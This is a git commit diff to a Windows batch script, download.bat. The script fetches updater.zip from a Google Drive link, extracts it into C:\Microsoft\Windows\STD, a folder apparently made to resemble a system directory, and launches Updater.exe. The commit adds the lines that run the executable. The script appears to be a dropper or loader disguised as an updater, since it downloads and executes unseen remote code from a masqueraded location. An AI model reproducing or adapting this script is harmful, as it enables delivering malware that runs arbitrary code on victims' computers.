2aa2717ab0c639281153fe875d6c6a8d094f8440
hecker942012 <hecker.942012@gmail.com>
2024-12-12 00:00:53 +0530

    Ver 5.2

--- download.bat
+++ download.bat
@@ -3,7 +3,7 @@ REM Define variables
 set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1ulcAHJrPW95EPZxCiCwTLLIDkXZOu6qh&export=download&authuser=0&confirm=t&uuid=787d72e5-b1e2-4926-91a8-5cde44ec29e2&at=APvzH3qpi1iAmLSmd4uC9IQPTA5A:1733940775126"
 set "destinationFolder=C:\Microsoft\Windows\STD"
 set "downloadedFileName=updater.zip"
-set "extractionFolder=%destinationFolder%\UpdaterFiles"
+set "extractionFolder=%destinationFolder%\"
 
 REM Ensure the destination folder exists
 if not exist "%destinationFolder%" (
@@ -23,11 +23,5 @@ if not exist "%extractionFolder%" (
 
 REM Extract the ZIP file using PowerShell
 powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"
-
-REM Define the Startup folder for the current user
-for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"
-
-REM Full path to the shortcut file
-set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"
-cd C:\Microsoft\Windows\STD\UpdaterFiles\
-start Updater.exe
+cd C:\Microsoft\Windows\STD\
+start C:\Microsoft\Windows\STD\Updater.exe -f
